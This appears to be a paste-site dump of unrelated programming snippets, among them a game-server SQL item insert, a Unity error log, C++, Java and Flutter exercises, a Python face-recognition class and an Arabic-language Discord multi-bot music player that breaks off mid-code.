      backgroundColor:'rgba(52,152,219,0.25)',
      borderColor:'rgba(41,128,185,1)'
    }]},
    options: {
      responsive:true,
      maintainAspectRatio:false,
      scales: { r:{min:0,max:100,ticks:{stepSize:20}} },
      plugins:{legend:{display:false}}
    }
  });
}

"
3y3k2EsZ,Мифик Бокс(запрос на добавление кастом итем),Sansuall,MySQL,Tuesday 17th of June 2025 05:44:20 AM CDT,"-- Мифический бокс
INSERT INTO world_bfa_cp.item_template6 (entry, InventoryType, AllowableClass, AllowableRace, ItemLevel, subclass, name, name_loc8, class, itemset, tooltip, tooltip_loc8) VALUES (300122, 0, -1, -1, 30, 5, 'The Eternal Palace Mythic (445 ilvl + other)', 'Вечный Дворец Мифический (445 ilvl + допы)', 22, 0, 'When you purchase, you get one item 445 ilvl, as well as from 1000 to 7000 gold, from 500 to 2500 units of Heart of Azeroth experience, as well as reputation with some factions (each category has its own % of random drop).', 'При приобретении вы получаете одну вещь 445 ilvl, а также от 1000 до 7000 золота, от 500 до 2500 ед.опыта Сердца Азерот, и репутацию с некоторыми фракциями (каждая категория имеет свой % случайного выпадения).');


-- Запрос на добавления в кабинет(в кастом добавлена 1):
REPLACE INTO TItemPrice VALUES
(300122, 2, 1150, 'Y', 000, '0', 1, 0);"
08bgGZG4,Untitled,artembelaev,VeriLog,Tuesday 17th of June 2025 05:35:26 AM CDT,"2025.06.17 15:19:37.279 10230 10956 Error Unity ServerUnknownException: Request error. Code: 4003, Message: Player not accepted EULA
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+AbstractProcessor.ProcessResponse (XDevs.Server.TF.TFRequest req, System.String responseText, System.String incomingSig, System.String dataSig) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+AbstractProcessor.ProcessResponse (XDevs.Server.TF.TFRequest req, System.String responseText, System.String incomingSig, System.String dataSig) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+HttpClientProcessor.DoRequest (XDevs.Server.TF.TFRequest req, System.Threading.CancellationToken token) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at System.Threading.Tasks.AwaitTaskContinuation.RunOrScheduleAction (System.Action action, System.Boolean allowInlining, System.Threading.Tasks.Task& currentTask) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at System.Threading.Tasks.Task.FinishContinuations () [0x00000] in <00000000000000000
"
dSp3Fg7z,Maximum sum Non Adjacent Element,Fastrail08,C++,Tuesday 17th of June 2025 03:46:08 AM CDT,"#include <bits/stdc++.h>
using namespace std;

void getMaximumSum(int index, int sum, int lastInc, int &maxSum, vector<int> &v){
    if(index >= v.size()){
        maxSum = max(maxSum, sum);
        return;
    }
    //select the number
    if(lastInc == -1 || lastInc < index - 1){
        getMaximumSum(index + 1, sum + v[index], index, maxSum, v);
    }
    
    //don't select the number
    getMaximumSum(index + 1, sum, lastInc, maxSum, v);
}

int getMaximumSumMemo(int index, int lastInc, vector<int> &v, vector<vector<int> > &memo){
    if(index >= v.size()){
        return 0;
    }
    if(lastInc != -1 && memo[index][lastInc] != -1){
        return memo[index][lastInc];
    }
    int selected = 0, notSelected = 0;
    // select the number
    if(lastInc == -1 || lastInc < index - 1){
        selected = v[index] + getMaximumSumMemo(index + 1, index, v, memo);
    }
    notSelected = getMaximumSumMemo(index + 1, lastInc, v, memo);
    if(lastInc != -1){
        memo[index][lastInc] = max(selected, notSelected); 
    }
    return max(selected, notSelected);
}

int getMaximumSumMemoOptimisedSpace(int index, int lastInc, vector<int> &v, vector<vector<int> > &memo){
    if(index >= v.size()){
        return 0;
    }
    int selected = 0, notSelected = 0;
    if(memo[index][lastInc] != -1){
        return memo[index][lastInc];
    }
    //selected
    if(lastInc == 0){
        selected = v[index] + getMaximumSumMemoOptimisedSpace(index + 1, 1, v, memo);
    }
    
    //not selected
    notSelected = getMaximumSumMemoOptimisedSpace(index + 1, 0, v, memo);
    
    return memo[index][lastInc] = max(selected, notSelected);
}

int main() {
	// your code goes here
    int n;
    cin >> n;
    vector<int> v(n);
    for(int i = 0; i < n; i++){
        cin >> v[i];
    }
    /*
    Recursive Call
    int maxSum = 0;
    getMaximumSum(0, 0, -1, maxSum, v);
    cout << maxSum << '\n';
    */
    
    /*
    Memo Call
        vector<vector<int> > memo(n, vector<int>(n, -1));
        cout << getMaximumSumMemo(0, -1, v, memo) << '\n';
    */
    
    /*
    Memo Call Optimised
    
    */
    
    vector<vector<int> > memo(n, vector<int>(2, -1));
    cout << getMaximumSumMemoOptimisedSpace(0, 0, v, memo);

}
"
hWEzirvy,Untitled,darrenbarnett,Java,Tuesday 17th of June 2025 03:34:53 AM CDT,"// Superclass
public class Animal {
    protected String name;
    protected int age;
    
    public Animal(String name, int age) {
        this.name = name;
        this.age = age;
    }
    
    public void eat() {
        System.out.println(name + "" is eating."");
    }
    
    public void sleep() {
        System.out.println(name + "" is sleeping."");
    }
    
    public String getName() {
        return name;
    }
    
    public int getAge() {
        return age;
    }
}

// Subclass
public class Dog extends Animal {
    private String breed;
    
    public Dog(String name, int age, String breed) {
        super(name, age);  // Call superclass constructor
        this.breed = breed;
    }
    
    public void bark() {
        System.out.println(name + "" is barking!"");
    }
    
    public String getBreed() {
        return breed;
    }
}

public class Main {
    public static void main(String[] args) {
        Dog myDog = new Dog(""Buddy"", 3, ""Golden Retriever"");
        myDog.eat();    // Inherited from Animal
        myDog.sleep();  // Inherited from Animal
        myDog.bark();   // Specific to Dog
    }
}

"
dZGUKFBN,Untitled,Codymawerick,Python,Tuesday 17th of June 2025 03:20:15 AM CDT,"import face_recognition
import os
import configparser

class FaceRecognition:
    def __init__(self):
        config = configparser.ConfigParser()
        config.read(os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config', 'config.ini'))
        self.known_face_encodings = []
        self.known_face_names = []
        faces_dir = config['Paths']['faces_dir']
        for filename in os.listdir(os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', faces_dir)):
            if filename.endswith(('.jpg', '.png')):
                image = face_recognition.load_image_file(os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', faces_dir, filename))
                encoding = face_recognition.face_encodings(image)
                if encoding:
                    self.known_face_encodings.append(encoding[0])
                    self.known_face_names.append(os.path.splitext(filename)[0])

    def recognize_face(self, frame):
        rgb_frame = frame[:, :, ::-1]  # Конвертация BGR (OpenCV) в RGB (face_recognition)
        face_locations = face_recognition.face_locations(rgb_frame)
        face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)

        worker_name = ""Неизвестный""
        face_recognized = False
        for face_encoding in face_encodings:
            matches = face_recognition.compare_faces(self.known_face_encodings, face_encoding)
            if True in matches:
                face_recognized = True
                worker_name = self.known_face_names[matches.index(True)]
                break
        return face_locations, worker_name, face_recognized"
nXyS34xk,vertical listview flutter,muhaiminurabir,Dart,Tuesday 17th of June 2025 03:08:45 AM CDT,"  Widget cartList() {
    return context.watch<CartProvider>().cartResponse != null &&
            context.watch<CartProvider>().cartResponse?.items != null &&
            context.watch<CartProvider>().cartResponse!.items!.isNotEmpty
        ? ListView.builder(
          shrinkWrap: true,
          scrollDirection: Axis.vertical,
          itemCount: context.watch<CartProvider>().cartResponse?.items?.length,
          itemBuilder: (BuildContext context, int index) {
            return Row(
              mainAxisSize: MainAxisSize.min,
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Expanded(
                  child: Text(
                    context
                            .watch<CartProvider>()
                            .cartResponse
                            ?.items
                            ?.elementAt(index)
                            ?.productName ??
                        """",
                    style: GoogleFonts.roboto(
                      fontSize: 14,
                      fontWeight: FontWeight.w400,
                      color: ProjectColors().blue3,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    softWrap: true,
                    textAlign: TextAlign.start,
                  ),
                ),
                Text(
                  context
                          .watch<CartProvider>()
                          .cartResponse
                          ?.items
                          ?.elementAt(index)
                          ?.totalPrice ??
                      ""0"",
                  style: GoogleFonts.roboto(
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                    color: ProjectColors().blue3,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                  softWrap: true,
                  textAlign: TextAlign.start,
                ),
              ],
            );
          },
        )
        : ColorLoader();
  }
"
PWKG7Hmf,horizontal listview flutter,muhaiminurabir,Dart,Tuesday 17th of June 2025 03:04:57 AM CDT," LimitedBox(
              maxHeight: 100,
              child: ListView.builder(
                shrinkWrap: true,
                scrollDirection: Axis.horizontal,
                itemCount:
                    context
                        .watch<CommonProvider>()
                        .productDetailsResponse
                        ?.data
                        ?.relatedItems
                        ?.data
                        ?.length,
                itemBuilder: (BuildContext context, int position) {
                  return GestureDetector(
                    onTap: () {
                      Navigator.of(context).push(
                        MaterialPageRoute(
                          builder:
                              (context) => ProductDetailsPage(
                                args: {
                                  ""id"":
                                      context
                                          .read<CommonProvider>()
                                          .productDetailsResponse
                                          ?.data
                                          ?.relatedItems
                                          ?.data?[position]
                                          ?.id,
                                },
                              ),
                        ),
                      );
                    },
                    child: Card(
                      color: ProjectColors().white,
                      elevation: 0,
                      shape: RoundedRectangleBorder(
                        side: BorderSide(
                          width: 1,
                          color: ProjectColors().white,
                        ),
                        borderRadius: BorderRadius.all(Radius.circular(10)),
                      ),
                      margin: EdgeInsets.all(5),
                      child: Padding(
                        padding: EdgeInsets.all(0),
                        child: SizedBox(
                          width: 56,
                          height: 56,
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: <Widget>[
                              CircleAvatar(
                                radius: 28,
                                child: CachedNetworkImage(
                                  height: 60,
                                  width: 60,
                                  imageUrl:
                                      context
                                          .watch<CommonProvider>()
                                          .productDetailsResponse
                                          ?.data
                                          ?.relatedItems
                                          ?.data?[position]
                                          ?.imageUrl ??
                                      """",
                                  placeholder:
                                      (context, url) => Image.asset(
                                        ""assets/images/placeholder_image.png"",
                                        height: 60,
                                        width: 60,
                                        fit: BoxFit.fill,
                                        scale: 10,
                                      ),
                                  errorWidget:
                                      (context, url, error) => Image.asset(
                                        ""assets/images/placeholder_image.png"",
                                        height: 60,
                                        width: 60,
                                        fit: BoxFit.fill,
                                        scale: 10,
                                      ),
                                  fit: BoxFit.cover,
                                  imageBuilder:
                                      (context, imageProvider) => CircleAvatar(
                                        backgroundImage: imageProvider,
                                      ),
                                ),
                              ),
                              Text(
                                context
                                        .watch<CommonProvider>()
                                        .productDetailsResponse
                                        ?.data
                                        ?.relatedItems
                                        ?.data?[position]
                                        ?.name ??
                                    """",
                                style: GoogleFonts.roboto(
                                  fontSize: 12,
                                  fontWeight: FontWeight.w500,
                                  color: ProjectColors().blue2,
                                ),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                                textAlign: TextAlign.center,
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  );
                },
              ),
            )"
sSkFL5Mr,Untitled,Hasli4,JavaScript,Tuesday 17th of June 2025 02:15:23 AM CDT,"// 1. Проверка числа: положительное, отрицательное или ноль
function checkNumber(n) {
  if (n > 0) {
    return ""Положительное"";
  } else if (n < 0) {
    return ""Отрицательное"";
  } else {
    return ""Ноль"";
  }
}

// 2. Проверка возраста
function checkAge(age) {
  if (age < 18) {
    return ""Доступ запрещён"";
  } else if (age <= 65) {
    return ""Доступ разрешён"";
  } else {
    return ""Доступ по договорённости"";
  }
}

// 3. Рейтинг товара
function ratingLabel(r) {
  if (r === 5) {
    return ""Отлично"";
  } else if (r === 4) {
    return ""Хорошо"";
  } else if (r === 3) {
    return ""Нормально"";
  } else if (r === 2) {
    return ""Плохо"";
  } else if (r === 1) {
    return ""Ужасно"";
  } else {
    return ""Рейтинг некорректен"";
  }
}

// 4. Проверка диапазона (включительно, порядок a и b не важен)
function inRange(x, a, b) {
  const min = Math.min(a, b);
  const max = Math.max(a, b);
  if (x >= min && x <= max) {
    return true;
  } else {
    return false;
  }
}

// 5. Скидка в магазине
function calcDiscount(sum) {
  let final;
  if (sum <= 1000) {
    final = sum;
  } else if (sum <= 5000) {
    final = sum * 0.95; // 5% скидка
  } else {
    final = sum * 0.90; // 10% скидка
  }
  return final;
}

// 6. Год високосный?
function isLeapYear(year) {
  if ((year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0)) {
    return true;
  } else {
    return false;
  }
}

// 7. Оценка по баллам
function grade(score) {
  if (score >= 90 && score <= 100) {
    return ""A"";
  } else if (score >= 80) {
    return ""B"";
  } else if (score >= 70) {
    return ""C"";
  } else if (score >= 60) {
    return ""D"";
  } else if (score >= 0) {
    return ""F"";
  } else {
    return ""Неверный балл"";
  }
}

// 8. Определение времени суток
function timeOfDay(hour) {
  if (hour >= 6 && hour <= 11) {
    return ""Утро"";
  } else if (hour >= 12 && hour <= 17) {
    return ""День"";
  } else if (hour >= 18 && hour <= 21) {
    return ""Вечер"";
  } else if ((hour >= 22 && hour <= 23) || (hour >= 0 && hour <= 5)) {
    return ""Ночь"";
  } else {
    return ""Неверный час"";
  }
}

// 9. Переписанная checkNumber с тернарным оператором
const checkNumberTernary = n =>
  n > 0 ? ""Положительное"" :
  n < 0 ? ""Отрицательное"" :
  ""Ноль"";

// 10. Тип билета
function ticketType(age, student) {
  if (age < 5) {
    return ""Бесплатно"";
  } else if (student === true) {
    return ""Студентский"";
  } else if (age > 60) {
    return ""Пенсионер"";
  } else {
    return ""Полный"";
  }
}
"
L3Mab1Gt,music,BETAlwrd,JavaScript,Tuesday 17th of June 2025 01:06:37 AM CDT,"function startBot(token) {
  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildVoiceStates,
      GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Channel]
  });

  client.botData = { token };
  bots.push(client);

  client.distube = new DisTube(client, {
    emitNewSongOnly: true,
    plugins: [

      new YtDlpPlugin({ update: true })
    ]
  });

  client.once(Events.ClientReady, async () => {
    const setup = getSetupData(client.user.username);
    if (!setup?.roomId) return;

    for (const [, guild] of client.guilds.cache) {
      const channel = guild.channels.cache.get(setup.roomId);
      if (channel) await joinVoiceChannel(client, channel);
    }
    console.log(`✅ Bot started: ${client.user.tag}`);
  });

  client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
    const setup = getSetupData(client.user.username);
    if (!setup?.roomId) return;

    const botId = client.user.id;
    const leftVC = oldState.channelId && !newState.channelId && oldState.id === botId;
    if (leftVC) {
      const key = `${botId}-${oldState.guild.id}`;
      if (rejoinLocks.has(key)) return;
      rejoinLocks.add(key);
      setTimeout(() => rejoinLocks.delete(key), 150);

      const channel = oldState.guild.channels.cache.get(setup.roomId);
      if (channel?.joinable) {
        try {
          await joinVoiceChannel(client, channel);
          console.log(`🔁 ${client.user.username} rejoined`);
        } catch (e) {
          console.error(e);
        }
      }
    }
  });
    client.login(token).catch(err => {
    console.error(`❌ Failed to login with token: ${token.slice(0, 10)}...`, err.message);
  });
}

function loadTokens() {
  if (!fs.existsSync(token_file_)) return [];
  try {
    const data = fs.readFileSync(token_file_, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    console.error(""خطأ أثناء قراءة tokens.json:"", err);
    return [];
  }
}

function saveTokens(tokens) {
  try {
    fs.writeFileSync(token_file_, JSON.stringify(tokens, null, 2));
  } catch (err) {
    console.error(""خطأ أثناء حفظ tokens.json:"", err);
  }
}
function saveSetupData(botName, channelId, newName) {
  const data = fs.existsSync(setupDataPath) ? JSON.parse(fs.readFileSync(setupDataPath)) : {};
  data[botName] = { roomId: channelId, name: newName };
  fs.writeFileSync(setupDataPath, JSON.stringify(data, null, 2));
}

function getSetupData(botName) {
  if (!fs.existsSync(setupDataPath)) return null;
  const data = JSON.parse(fs.readFileSync(setupDataPath));
  return data[botName];
}

async function searchYouTube(query) {
  if (cache.has(query)) return cache.get(query);
  try {
    const { data } = await axios.get(""https://www.googleapis.com/youtube/v3/search"", {
      params: {
        part: ""snippet"",
        type: ""video"",
        q: query,
        key: yt_api,
        maxResults: 1
      }
    });
    const video = data.items?.[0];
    const url = video ? `https://www.youtube.com/watch?v=${video.id.videoId}` : null;
    if (url) cache.set(query, url);
    return url;
  } catch (err) {
    console.error(""YouTube Search API Error:"", err.response?.data || err);
    return null;
  }
}

async function joinVoiceChannel(client, channel) {
  if (!channel?.joinable) return;
  if (client.distube.voices.get(channel.guild.id)) return;

  try {
    await client.distube.voices.join(channel);
    console.log(`✅ ${client.user.username} joined ${channel.id}`);
  } catch (err) {
    console.warn(`❌ ${client.user.username} failed to join ${channel.id}:`, err.message);
  }
}

config.bots.forEach((botData, index) => {
  setTimeout(() => {
    const client = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.MessageContent
      ],
      partials: [Partials.Channel]
    });

    client.botData = botData;

    client.distube = new DisTube(client, {
      emitNewSongOnly: true,
      plugins: [

        new YtDlpPlugin({ update: true })
      ]
    });

    client.once(Events.ClientReady, async () => {
      const setup = getSetupData(client.user.username);
      if (!setup?.roomId) return;

      for (const [, guild] of client.guilds.cache) {
        const channel = guild.channels.cache.get(setup.roomId);
        if (channel) await joinVoiceChannel(client, channel);
      }
    });

    client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
      const setup = getSetupData(client.user.username);
      if (!setup?.roomId) return;

      const botId = client.user.id;
      const leftVC = oldState.channelId && !newState.channelId && oldState.id === botId;
      if (leftVC) {
        const key = `${botId}-${oldState.guild.id}`;
        if (rejoinLocks.has(key)) return;
        rejoinLocks.add(key);
        setTimeout(() => rejoinLocks.delete(key), 150);

        const channel = oldState.guild.channels.cache.get(setup.roomId);
        if (channel?.joinable) {
          try {
            await joinVoiceChannel(client, channel);
            console.log(`🔁 ${client.user.username} rejoined`);
          } catch (e) {
            console.error(e);
          }
        }
      }
    });


    client.distube.on(""playSong"", async (queue, song) => {
      const embed = new EmbedBuilder()
        .setTitle(""Now playing"")
        .setDescription(`**[${song.name}](${song.url})**`)
        .setThumbnail(song.thumbnail)
        .addFields(
          { name: ""Author"", value: song.uploader?.name || ""Unknown"", inline: true },
          { name: ""Duration"", value: song.formattedDuration || ""--:--"", inline: true }
        )
        .setColor(""Red"");
      const controls = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(""loop"").setStyle(ButtonStyle.Secondary).setEmoji(""<:loop_arqet:1382208868352004218>""),
        new ButtonBuilder().setCustomId(""music_down"").setStyle(ButtonStyle.Secondary).setEmoji(""<:down_arqet:1382208866246332526>""),
        new ButtonBuilder().setCustomId(""stop"").setStyle(ButtonStyle.Secondary).setEmoji(""<:stop_arqet:1382208861162831994>""),
        new ButtonBuilder().setCustomId(""music_up"").setStyle(ButtonStyle.Secondary).setEmoji(""<:up_arqet:1382208863893327942>""),
        new ButtonBuilder().setCustomId(""skip"").setStyle(ButtonStyle.Secondary).setEmoji(""<:skip_arqet:1382213952196575282>""));
      const msg = await queue.textChannel.send({ content:""**↯ Playing**: \`""+song.name+""\` - (\`""+song.formattedDuration+""\`)"", components: [controls] });
    });
  
    client.on(Events.InteractionCreate, async (interaction) => {
      if (!interaction.isButton()) return;
      const queue = client.distube.getQueue(interaction);
      const memberVC = interaction.member.voice?.channelId;
      const botVC = interaction.guild.members.me.voice?.channelId;
  
      if (!queue || memberVC !== botVC) {
        return interaction.reply({ content: ""يجب أن تكون في نفس روم البوت للتحكم."", ephemeral: true });
      }
  
      try {
        switch (interaction.customId) {
              case ""play"":if (!args[0]) return message.reply(""❗ You need to provide a song name or URL."");
              distube.play(voiceChannel, args.join("" ""), { textChannel: message.channel, member: message.member });break;
              case ""pause"":if (!queue.paused) queue.pause();break;
              case ""resume"":if (queue.paused) queue.resume();break;
              case ""skip"":if (queue.songs.length > 1) queue.skip();break;
              case ""stop"":queue.stop(); break;
              case ""loop"":queue.setRepeatMode(queue.repeatMode === 0 ? 1 : 0);break;
              case ""loopqueue"":queue.setRepeatMode(queue.repeatMode === 2 ? 0 : 2);break;
              //case ""volume"":const vol = parseInt(args[0]);if (isNaN(vol) || vol < 0 || vol > 150) return message.reply(""📢 Volume must be between 0 and 150."");queue.setVolume(vol);break;
              case ""music_down"": {if (!queue) return interaction.reply({ content: ""❌ No music playing."", ephemeral: true });
              const vol = Math.max(0, queue.volume - 20);queue.setVolume(vol);await interaction.reply({ content: `🔉 Volume decreased to **${vol}%**`, ephemeral: true });break;}
              case ""music_up"": {if (!queue) return interaction.reply({ content: ""❌ No music playing."", ephemeral: true });
              const vol = Math.min(100, queue.volume + 20);queue.setVolume(vol);await interaction.reply({ content: `🔊 Volume increased to **${vol}%**`, ephemeral: true });break;}
              case ""seek"":const time = parseInt(args[0]);if (isNaN(time)) return message.reply(""⏩ Provide time in seconds to seek."");queue.seek(time);break;
              case ""shuffle"":queue.shuffle();break;
              case ""autoplay"":queue.toggleAutoplay();break;
              case ""nowplaying"":const song = queue.songs[0];message.reply(`🎶 Now Playing: **${song.name}** - \`${song.formattedDuration}\``);break;
              case ""queue"":if (!queue || !queue.songs.length) return message.reply(""📭 The queue is empty."");const q = queue.songs
              .map((song, i) => `${i === 0 ? ""**▶️"" : `${i + 1}.`} ${song.name}** - \`${song.formattedDuration}\``).join(""\n"");message.reply(`🎧 **Queue List:**\n${q}`);break;
              case ""remove"":const index = parseInt(args[0]);if (isNaN(index) || index < 1 || index >= queue.songs.length)return message.reply(""❌ Invalid song number."");
              const removed = queue.songs.splice(index, 1);message.reply(`🗑️ Removed: **${removed[0].name}**`);break;default:message.reply(""Unknown"");break;
        }
        await interaction.deferUpdate();
      } catch (e) {
        console.error(""Interaction error:"", e);
        interaction.reply({ content: ""حدث خطأ."", ephemeral: true });
      }
    });

const client_1 = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const owners = new Set();
owners.add([""159824469899214848""]);
client_1.on(Events.MessageCreate, async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const commandText = args[0]?.toLowerCase();
  if ([""restart"", ""add"", ""addown""].includes(commandText)) {
    if (!owners.has(message.author.id)) {
      return message.react(""❌"");
    }
  }


  if (commandText === ""add"") {
      if (args.length < 2) return message.react(""❌"");
    
      let config = {};
      let tokens = [];
    
      try {
        const data = fs.readFileSync('./config.json', 'utf8');
        config = JSON.parse(data);
        tokens = Array.isArray(config.tokens) ? config.tokens : [];
      } catch (error) {
        console.log(""خطأ في قراءة config.json:"", error);
      }
    
      const newTokens = args.slice(1);
      const existingTokens = tokens.map(t => t.token);
      const duplicateTokens = newTokens.filter(t => existingTokens.includes(t));
    
      if (duplicateTokens.length > 0) {
        return message.reply(`**❌ بعض التوكنات موجودة بالفعل**\n\`${duplicateTokens.join('\n')}\``)
          .then(msg => setTimeout(() => { msg.delete(); message.delete(); }, 5000));
      }
    
      newTokens.forEach(t => tokens.push({ token: t }));
      config.tokens = tokens;
    
      try {
        fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
        message.reply(`✅ تم إضافة التوكنات:\n\`${newTokens.join('\n')}\``)
          .then(msg => setTimeout(() => { msg.delete(); message.delete(); }, 5000));
      } catch (e) {
        console.error(""خطأ في حفظ التوكنات:"", e);
        message.react(""❌"");
      }
    
      return;
    }
    

  if (commandText === ""addown"") {
    const userId = args[1]?.replace(/<@!?(\d+)>/, ""$1"");
    if (!userId) return message.reply(""❌ الرجاء كتابة معرف المستخدم أو منشنه."");
    if (userId === ""159824469899214848"") return message.react(""❌"");
    if (owners.has(userId)) return message.react(""❌"");

    owners.add(userId);
    message.react(""✅"");
    return;
  }
});
    client_1.login(config.main_bot);

    client.on(Events.MessageCreate, async (message) => {
      if (!message.guild || message.author.bot) return;
      const args = message.content.trim().split(/ +/);
      const commandText = args[0]?.toLowerCase();
      const query = args.slice(1).join("" "");
      const vc = message.member.voice.channel;
      const setup = getSetupData(client.user.username);
      const allowedRoom = setup?.roomId;
      const queue = client.distube.getQueue(message);

    if (message.mentions.has(client.user)) {
      const cmd = args[1]?.toLowerCase();
      const imgURL = message.attachments.first()?.url || args[2];

      if (cmd === ""setup"") {
        if (!vc) return message.react(""❌"");
        try {
          await client.user.setUsername(vc.name);
          saveSetupData(client.user.username, vc.id, vc.name);
          await client.distube.voices.join(vc);
          await message.react(""✅"");
          setTimeout(() => {
            client.user.setUsername(client.botData.name).catch(() => {});
          }, 86400000);
        } catch (e) {
          console.error(""Setup error:"", e);
          message.react(""❌"");
        }
      }

      if (cmd === ""sa"" && imgURL) {
        try {
          await client.user.setAvatar(imgURL);
          message.react(""✅"");
        } catch (e) {
          console.error(""Avatar error:"", e);
          message.react(""❌"");
        }
      }

      if (cmd === ""sb"" && imgURL) {
        try {
          await client.user.setBanner(imgURL);
          message.react(""✅"");
        } catch (e) {
          console.error(""Banner error:"", e);
          message.react(""❌"");
        }
      }
      if (cmd === ""sn"" && args.length) {
        try {
          await client.user.setUsername(args.join("" ""));
          message.react(""✅"");
        } catch (e) {
          console.error(""Username error:"", e);
          message.react(""❌"");
        }
      }
    }  
      if (!vc || vc.id !== allowedRoom) return;
  
      if ([""ش"", ""شغل""].includes(commandText) && query) {
        let url = query;
        try {
          await client.distube.play(vc, query, { textChannel: message.channel, member: message.member });
        } catch (err) {
          console.warn(""DisTube play failed, trying YouTube API fallback"");
          url = await searchYouTube(query);
          if (!url) return message.react(""❌"");
          try {
            await client.distube.play(vc, url, { textChannel: message.channel, member: message.member });
          } catch (e) {
            console.error(""Play error after fallback:"", e);
            message.react(""❌"");
          }
        }
      }
  
      if ([""وقف"", ""ايقاف""].includes(commandText)) {
        if (queue) queue.stop(), message.react(""<:stop_arqet:1382208861162831994>"");
        else message.react(""❌"");
      }
  
      if ([""سكب"", ""تخطي""].includes(commandText)) {
        if (queue?.songs.length > 1) queue.skip(), message.react(""<:skip_arqet:1382213952196575282>"");
        else message.react(""❌"");
      }
  
      if ([""قائمة"", ""list"", ""queue""].includes(commandText)) {
      if (!queue?.songs.length) return message.react(""❌"");const list = queue.songs.map((s, i) => `${i === 0 ? ""🔊"" : `${i + 1}.`} ${s.name} - \`${s.formattedDuration}\``).join(""\n"");message.reply(`🎶 **قائمة التشغيل:**\n${list}`);}
      if ([""وقّف"", ""بوز"", ""توقيف"", ""ايقاف مؤقت"", ""pause""].includes(commandText)) {if (queue && !queue.paused) queue.pause(), message.react(""<:stop_arqet:1382208861162831994>"");else message.react(""❌"");}
      if ([""كمل"", ""استئناف"", ""resume""].includes(commandText)) {if (queue?.paused) queue.resume(), message.react(""<:start_arqet:1382208858692255854>"");else message.react(""❌"");}
      if ([""صوت"", ""vol"", ""volume""].includes(commandText)) {
        const vol = parseInt(args[1]);
        if (isNaN(vol) || vol < 0 || vol > 100) return message.reply(""❌ اكتب رقم بين 0 و 100"");
        queue.setVolume(vol);
        return message.reply(`🔊 تم ضبط الصوت على ${vol}%`);
      }
      
      if ([""تكرار"", ""loop""].includes(commandText)) {
      if (queue) {const mode = queue.repeatMode === 0 ? 1 : queue.repeatMode === 1 ? 2 : 0;queue.setRepeatMode(mode); message.react([""<:loop_arqet:1382208868352004218>"", ""<:loop_arqet:1382208868352004218>"", ""<:loop_arqet:1382208868352004218>""][mode]);} else message.react(""❌"");
      }
      
      if ([""عشوائي"", ""shuffle""].includes(commandText)) {
        if (queue) queue.shuffle(), message.react(""🔀"");
        else message.react(""❌"");
      }
      
      if ([""ازالة"", ""remove""].includes(commandText)) {
        const index = parseInt(args[1]);
        if (!queue || isNaN(index) || index <= 0 || index >= queue.songs.length) {
          return message.reply(""❌ رقم غير صحيح أو لا توجد قائمة"");
        }
        queue.songs.splice(index, 1);
        message.reply(`🗑️ تم حذف الأغنية رقم ${index}`);
      }
      
      if ([""الان"", ""now"", ""np"", ""nowplaying""].includes(commandText)) {
        if (!queue?.songs.length) return message.react(""❌"");
        const song = queue.songs[0];
        const nowPlaying = `🎵 **الآن:** [${song.name}](${song.url}) - \`${song.formattedDuration}\``;
        message.reply(nowPlaying);
      }
      
      if ([""اوامر"", ""help"", ""commands""].includes(commandText)) {
        const helpText = `**أوامر الميوزك:**\n` +
          `• تشغيل: ش, شغل <كلمة أو رابط>\n` +
          `• إيقاف: وقف, ايقاف\n` +
          `• تخطي: سكب, تخطي\n` +
          `• إيقاف مؤقت: وقّف, بوز\n` +
          `• استئناف: كمل\n` +
          `• قائمة التشغيل: قائمة, list\n` +
          `• تكرار: تكرار\n` +
          `• الصوت: صوت <0-100>\n` +
          `• عشوائي: عشوائي\n` +
          `• الآن: الان, now\n` +
          `• ازالة: ازالة <رقم>`;
        message.reply(helpText);
      }
      
    });

    
    client.on(""error"", error => {
      if (error.message?.includes(""Cannot connect to the voice channel after 30 seconds"")) return;
      const name = client?.user?.username || ""Unknown"";
      console.error(`[${name}] Uncaught Error:`, error);
    });
    const name_1 = client?.user?.username || ""Unknown"";
    process.on(""unhandledRejection"", () => console.error());
    process.on(""uncaughtException"", (err) => console.error(`[${name_1}] Uncaught Exception:`, err));
    process.on(""uncaughtExceptionMonitor"", (err) => console.warn(`[${name_1}] Exception Monitor:`, err));

    client.login(botData.token);
    bots.push(client);
  }, index * 50);
});
const admin = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

admin.on(Events.MessageCreate, async (message) => {
  if (!message.guild || message.author.bot) return;
  const args = message.content.trim().split(/ +/);
  const command = args[0]?.toLowerCase();

  if (!owners.has(message.author.id)) return;

